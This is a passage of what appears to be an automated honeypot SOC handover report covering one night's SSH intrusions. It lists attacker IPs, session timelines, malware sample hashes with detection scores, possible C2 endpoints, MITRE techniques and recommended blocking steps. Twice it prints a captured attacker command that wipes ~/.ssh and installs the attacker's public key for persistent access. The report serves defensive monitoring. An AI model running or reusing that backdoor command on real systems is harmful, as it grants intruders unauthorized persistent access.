| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:38:21` | `cowrie.session.connect` |
| `2026-10-16 00:38:21` | `cowrie.client.version` |
| `2026-10-16 00:38:22` | `cowrie.client.kex` |
| `2026-10-16 00:38:23` | `cowrie.login.success` |
| `2026-10-16 00:38:24` | `cowrie.session.params` |
| `2026-10-16 00:38:24` | `cowrie.command.input` |
| `2026-10-16 00:38:24` | `cowrie.command.failed` |
| `2026-10-16 00:38:24` | `cowrie.log.closed` |
| `2026-10-16 00:38:25` | `cowrie.session.params` |
| `2026-10-16 00:38:25` | `cowrie.command.input` |
| `2026-10-16 00:38:25` | `cowrie.session.file_download` |
| `2026-10-16 00:38:25` | `cowrie.log.closed` |
| `2026-10-16 00:38:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ae59be9e283

| Field | Detail |
|---|---|
| **Source IP** | `202.51.214[.]98` |
| **First Seen** | 2026-10-16 00:38 |
| **Last Seen** | 2026-10-16 00:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:38:25` | `cowrie.session.connect` |
| `2026-10-16 00:38:25` | `cowrie.client.version` |
| `2026-10-16 00:38:26` | `cowrie.client.kex` |
| `2026-10-16 00:38:27` | `cowrie.login.success` |
| `2026-10-16 00:38:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.51.214[.]98` to AbuseIPDB if not already reported
- [ ] Block `202.51.214[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b0d659f3f72

| Field | Detail |
|---|---|
| **Source IP** | `85.133.193[.]72` |
| **First Seen** | 2026-10-16 00:39 |
| **Last Seen** | 2026-10-16 00:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:39:44` | `cowrie.session.connect` |
| `2026-10-16 00:39:44` | `cowrie.client.version` |
| `2026-10-16 00:39:44` | `cowrie.client.kex` |
| `2026-10-16 00:39:45` | `cowrie.login.success` |
| `2026-10-16 00:39:45` | `cowrie.session.params` |
| `2026-10-16 00:39:45` | `cowrie.command.input` |
| `2026-10-16 00:39:45` | `cowrie.command.failed` |
| `2026-10-16 00:39:46` | `cowrie.log.closed` |
| `2026-10-16 00:39:47` | `cowrie.session.params` |
| `2026-10-16 00:39:47` | `cowrie.command.input` |
| `2026-10-16 00:39:47` | `cowrie.session.file_download` |
| `2026-10-16 00:39:47` | `cowrie.log.closed` |
| `2026-10-16 00:39:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.133.193[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.133.193[.]72` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-375439046b77

| Field | Detail |
|---|---|
| **Source IP** | `85.133.193[.]72` |
| **First Seen** | 2026-10-16 00:39 |
| **Last Seen** | 2026-10-16 00:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:39:47` | `cowrie.session.connect` |
| `2026-10-16 00:39:47` | `cowrie.client.version` |
| `2026-10-16 00:39:47` | `cowrie.client.kex` |
| `2026-10-16 00:39:48` | `cowrie.login.success` |
| `2026-10-16 00:39:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.133.193[.]72` to AbuseIPDB if not already reported
- [ ] Block `85.133.193[.]72` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ac0397a8dede

| Field | Detail |
|---|---|
| **Source IP** | `62.171.161[.]117` |
| **First Seen** | 2026-10-16 00:43 |
| **Last Seen** | 2026-10-16 00:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:43:39` | `cowrie.session.connect` |
| `2026-10-16 00:43:39` | `cowrie.client.version` |
| `2026-10-16 00:43:39` | `cowrie.client.kex` |
| `2026-10-16 00:43:40` | `cowrie.login.success` |
| `2026-10-16 00:43:40` | `cowrie.session.params` |
| `2026-10-16 00:43:40` | `cowrie.command.input` |
| `2026-10-16 00:43:41` | `cowrie.log.closed` |
| `2026-10-16 00:43:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `62.171.161[.]117` to AbuseIPDB if not already reported
- [ ] Block `62.171.161[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d0692cd5d32

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]106` |
| **First Seen** | 2026-10-16 00:54 |
| **Last Seen** | 2026-10-16 00:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 00:54:01` | `cowrie.session.connect` |
| `2026-10-16 00:54:01` | `cowrie.client.version` |
| `2026-10-16 00:54:01` | `cowrie.client.kex` |
| `2026-10-16 00:54:03` | `cowrie.login.success` |
| `2026-10-16 00:54:04` | `cowrie.session.params` |
| `2026-10-16 00:54:04` | `cowrie.command.input` |
| `2026-10-16 00:54:04` | `cowrie.log.closed` |
| `2026-10-16 00:54:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]106` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `109.160.32[.]106` | 1 | 2026-10-16 00:53 | 2026-10-16 00:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `115.190.126[.]161` | 1 | 2026-10-16 00:23 | 2026-10-16 00:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.122.147[.]195` | 1 | 2026-10-16 00:21 | 2026-10-16 00:23 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.122.37[.]247` | 1 | 2026-10-16 00:03 | 2026-10-16 00:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-16 00:34 | 2026-10-16 00:34 | 9s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-16 00:10 | 2026-10-16 00:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.213[.]90` | 1 | 2026-10-16 00:19 | 2026-10-16 00:21 | 120s | 0 | `T1592` | 🟢 LOW |
| `156.155.118[.]59` | 1 | 2026-10-16 00:25 | 2026-10-16 00:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-16 00:04 | 2026-10-16 00:04 | 301s | 0 | `T1592` | 🟢 LOW |
| `198.74.56[.]6` | 1 | 2026-10-16 00:36 | 2026-10-16 00:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.119.43[.]15` | 1 | 2026-10-16 00:41 | 2026-10-16 00:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `48.217.49[.]53` | 1 | 2026-10-16 00:07 | 2026-10-16 00:07 | 10s | 0 | `T1592` | 🟢 LOW |
| `91.239.95[.]19` | 1 | 2026-10-16 00:32 | 2026-10-16 00:32 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `0886e17b38d09ef7b0855a2394dd33454939edb3f33a43096c93e0dccfe6a81c` | ELF Binary (Linux executable) (x86-64 64-bit) | `0886e17b38d09ef7...` | 34/100 | 🟢 LOW | **10/75** 🔴 |
| `094d2147548839ba5ed36d884983aaf14bd7ae650095dec96a1cf537d3b23b48` | ELF Binary (Linux executable) (x86-64 64-bit) | `094d2147548839ba...` | 45/100 | 🟡 MEDIUM | **39/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` | Bash Script | `0fad00ddec16b67f...` | 70/100 | 🔴 HIGH | **25/75** 🔴 |
| `107a9bfb3d0bb71a33ae17a9eac844a7a7562270a09b5ccce608a78316df0222` | ELF Binary (Linux executable) (x86 32-bit) | `107a9bfb3d0bb71a...` | 35/100 | 🟢 LOW | **13/75** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16254f69dc7011bdd51beb489af5e9825959e4098e565332da99f8cb58b7a76e` | ELF Binary (Linux executable) (x86 32-bit) | `16254f69dc7011bd...` | 30/100 | 🟢 LOW | **1/75** 🔴 |
| `163cb287fd8f81c13901eb4ddaea2db326213f4d2095e0e64321b9afd8300480` | ELF Binary (Linux executable) (x86 32-bit) | `163cb287fd8f81c1...` | 36/100 | 🟢 LOW | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1946ee7ec655de32199ce87390699db1e18d80438bdf01f3b813a929e5cce4e6` | ELF Binary (Linux executable) (MIPS 32-bit) | `1946ee7ec655de32...` | 58/100 | 🟡 MEDIUM | **45/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e5e56d2ffc990b1dd966e12a02d89d7dcad92c2f23c34834fbfa8c792d56520` | Unknown binary | `1e5e56d2ffc990b1...` | 22/100 | 🟢 LOW | **30/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `1ff7c192f591fe63fae453eb8a91da94b276376d3880e3078c3c5a20ba6b45ab` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ff7c192f591fe63...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` (05af569c3595b01e0724bc96...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/.kworker`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.161[.]96:55487`

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`0fad00ddec16b67f3131aa4efffbe32d78fca178407895920b7549667d7bbfbf` (0fad00ddec16b67f3131aa4e...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `193.112.192[.]91` | CN | Tencent Cloud Computing (Beijing) Co., Ltd | **100** ⚠️ | 2 |
| `195.178.110[.]218` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 50 |
| `132.148.30[.]167` | US | GoDaddy.com, LLC | **100** ⚠️ | 25 |
| `48.217.49[.]53` | US | Microsoft Limited | **100** ⚠️ | 6 |
| `164.30.17[.]82` | DE | T-Systems International GmbH | **100** ⚠️ | 7 |
| `109.160.32[.]106` | NL | Global Communication Net Plc | **100** ⚠️ | 33 |
| `139.199.80[.]137` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 10 |
| `14.103.213[.]90` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 15 |
| `198.74.56[.]6` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 33 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 21 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 7 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 7 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 7 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 41 cases |
| Tool 34  | Credential Extractor        | ✅ 118 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 14 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (19.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 34 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 20 priority case(s) shown individually · 13 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-10-16T02:06:11Z_
